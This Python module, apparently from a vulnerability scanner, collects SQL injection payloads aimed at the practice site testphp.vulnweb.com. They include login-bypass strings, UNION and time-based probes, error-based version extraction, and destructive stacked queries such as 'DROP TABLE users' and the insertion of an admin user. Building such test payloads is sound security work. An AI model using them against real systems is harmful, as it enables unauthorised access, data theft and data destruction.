"""
SQL injection payloads for testing SQL injection vulnerabilities
"""

class SQLiPayloads:
    """SQL injection payload collection"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic SQL injection payloads optimized for testphp.vulnweb.com"""
        return [
            # Basic error-based
            "'",
            "''",
            '"',
            '""',
            
            # Boolean-based
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            '" OR "1"="1',
            '" OR 1=1--',
            '" OR 1=1#',
            
            # Authentication bypass
            "admin'--",
            "admin'#",
            "admin'/*",
            "' OR 'a'='a",
            '" OR "a"="a',
            "admin' OR '1'='1'--",
            "admin' OR 1=1--",
            
            # Union-based
            "' UNION SELECT 1--",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "1' UNION SELECT 1,2,3--",
            "1 UNION SELECT 1,2,3",
            "' UNION ALL SELECT 1--",
            "' UNION ALL SELECT NULL--",
            
            # Time-based blind
            "' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; WAITFOR DELAY '0:0:5'--",
            
            # Error-based
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Numeric injection
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1 OR 1=1",
            "1 OR 1=2",
            
            # Comment variations
            "' OR 1=1 LIMIT 1--",
            "' OR 1=1 LIMIT 1#",
            "' OR 1=1 LIMIT 1/*",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES(1,'admin','admin')--",
            
            # Double query
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND (SELECT COUNT(*) FROM mysql.user)>0--"
        ]
    
    @staticmethod
    def get_time_based_payloads():
        """Get time-based SQL injection payloads"""
        return [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR pg_sleep(5)--",
            "1; SELECT SLEEP(5)",
            "' UNION SELECT SLEEP(5)--"
        ]
    
    @staticmethod
    def get_union_payloads():
        """Get UNION-based SQL injection payloads"""
        return [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name FROM information_schema.tables--"
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all SQL injection payloads"""
        return (SQLiPayloads.get_basic_payloads() + 
                SQLiPayloads.get_time_based_payloads() + 
                SQLiPayloads.get_union_payloads())
